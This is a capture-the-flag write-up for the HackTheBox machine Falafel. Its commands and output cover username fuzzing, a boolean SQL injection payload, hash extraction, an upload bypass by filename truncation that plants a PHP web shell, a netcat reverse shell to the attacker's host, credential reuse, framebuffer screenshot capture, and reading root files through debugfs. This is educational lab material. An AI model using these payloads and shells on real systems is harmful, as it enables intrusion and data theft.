### Writeups
* https://www.noobsec.net/hackthebox/htb-falafel-writeup-w-o-metasploit/

### Enum User
```bash
❯ export IP=10.129.87.147
❯ wfuzz -u http://$IP/login.php -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -d 'username=FUZZ&password=pass' --hw 657 -c
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.87.147/login.php
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                          
=====================================================================

000000086:   200        102 L    659 W      7091 Ch     "admin"                                                                                                                          
000001886:   200        102 L    659 W      7091 Ch     "chris"
```

### SQLi with Burp
It’s important to keep in mind that when our SQL injection is working, we get the error “Wrong identification”, and when it does not, we get an error “Try again”.

Similarly, we can extract the hashes of the users present in here.

We’ll test for `[a-f0-9]` (because hashes) for each character position for the password column, and if we get the error “Wrong identification”, then it would indicate that for position X the password column has that character.

```burp
username=admin'+AND+substring(username,1,1)='a'--+-&password=pass
```

### Hash Extraction - Burp Intruder
Use Brute forcer instead of generating another one time list

### Python to automation since Burp still slow for that
```bash
❯ python3 admin-hash.py
0e462096931906507119562988736854
Hash is:        0e462096931906507119562988736854

john's hash 

❯ time python3 admin-hash.py
d4ee02a22fc872e36d9e3751ba72ddc8
Hash is:        d4ee02a22fc872e36d9e3751ba72ddc8 -> md5 juggling

python3 admin-hash.py  1.72s user 0.25s system 0% cpu 3:19.89 total
```

Chris
Juggler by day, Hacker by night
Hey, my name is chris, and I work at the local circus as a juggler. After work, I always eat falafel.
By night, I pentest random websites as a hobby. It's funny how sometimes both the hobby and work have something in common.. 

### PHP Type Juggling
* https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09
* https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf <- Insomnia 2015
* https://github.com/A1vinSmith/hashes/blob/master/md5.md

### File Upload
```bash
❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4
❯ touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4.png
touch: cannot touch 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4.png': File name too long
❯ touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.115.123 - - [21/Feb/2023 14:36:58] "GET /Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

❯ echo -n "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah" >> off_set3

❯ wc off_set3
  0   1 236 off_set3

> "Let's use 232 then add 4 Chars as extension = 236"

❯ msf-pattern_offset -l 255 -q h7Ah
[*] Exact match at offset 232

❯ python -c 'print("A" * 232)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

❯ touch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png
❯ echo -n "<?php echo system(\$_REQUEST['cmd']); ?>" > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png

❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.115.123 - - [21/Feb/2023 14:56:02] "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png HTTP/1.1" 200 -
```

### Foothold
```bash
curl http://10.129.115.123/uploads/0221-0355_41a27f8385706a49/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=id

curl http://10.129.115.123/uploads/0221-0355_41a27f8385706a49/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.3%2080%20%3E%2Ftmp%2Ff
```

revshelle.com url encoding to make it work

### Lateral movement to moshe
```bash
www-data@falafel:/var/www/html$ cat connection.php
cat connection.php
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
```

### SSH as password reuse
```bash
ssh moshe@$IP 
```

### Lateral movement from moshe to Yossi
* https://youtu.be/CUbWpteTfio?t=2575
* https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#privesc-moshe---yossi

```bash
$ w
 04:24:19 up  1:19,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      03:05    1:18m  0.06s  0.05s -bash
moshe    pts/0    10.10.16.3       04:14    0.00s  0.00s  0.00s w
$ id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
$ groups
moshe adm mail news voice floppy audio video games
$ for x in $(groups); do echo ========${x}========; find / -group ${x} ! -type d -exec ls -la {} \; 2>/dev/null > ${x}; done
========moshe========
========adm========
========mail========
========news========
========voice========
========floppy========
========audio========
========video========
========games========
$ ls -l
total 68
-rw-rw-r-- 1 moshe moshe  1832 Feb 21 04:25 adm
-rw-rw-r-- 1 moshe moshe   119 Feb 21 04:25 audio
-rw-rw-r-- 1 moshe moshe     0 Feb 21 04:25 floppy
-rw-rw-r-- 1 moshe moshe     0 Feb 21 04:25 games
-rw-rw-r-- 1 moshe moshe     0 Feb 21 04:25 mail
-rw-rw-r-- 1 moshe moshe 50120 Feb 21 04:25 moshe
-rw-rw-r-- 1 moshe moshe     0 Feb 21 04:25 news
-r-------- 1 moshe moshe    33 Feb 21 03:06 user.txt
-rw-rw-r-- 1 moshe moshe   244 Feb 21 04:25 video
-rw-rw-r-- 1 moshe moshe     0 Feb 21 04:25 voice

$ cat video
crw-rw---- 1 root video 29, 0 Feb 21 03:05 /dev/fb0
crw-rw----+ 1 root video 226, 0 Feb 21 03:05 /dev/dri/card0
crw-rw----+ 1 root video 226, 128 Feb 21 03:05 /dev/dri/renderD128
crw-rw---- 1 root video 226, 64 Feb 21 03:05 /dev/dri/controlD64
$ file /dev/fb0
/dev/fb0: character special (29/0)
$ cat /dev/fb0 > screenshot.raw

$ pwd
/home/moshe

$ cat /sys/class/graphics/fb0/virtual_size
1176,885
```

```bash
❯ scp moshe@$IP:/dev/fb0 .
moshe@10.129.115.123's password: 
scp: download /dev/fb0: not a regular file
❯ scp moshe@$IP:/home/moshe/screenshot.raw .
moshe@10.129.115.123's password: 
screenshot.raw 

❯ file screenshot.raw
screenshot.raw: Targa image data - Map (256-257) 257 x 1 x 1 +257 +1 - 1-bit alpha "\001"   
```

`apt install gimp` https://pkg.kali.org/pkg/gimp

Yossi:MoshePlzStopHackingMe!

### Root
```bash
yossi@falafel:/dev$ ls -la | grep sd
brw-rw----  1 root  disk      8,   0 Feb 21 03:05 sda
brw-rw----  1 root  disk      8,   1 Feb 21 03:05 sda1
brw-rw----  1 root  disk      8,   2 Feb 21 03:05 sda2
brw-rw----  1 root  disk      8,   5 Feb 21 03:05 sda5

yossi@falafel:~$ debugfs /dev/sda1
debugfs 1.42.13 (17-May-2015)
debugfs:  cat /root/root.txt
```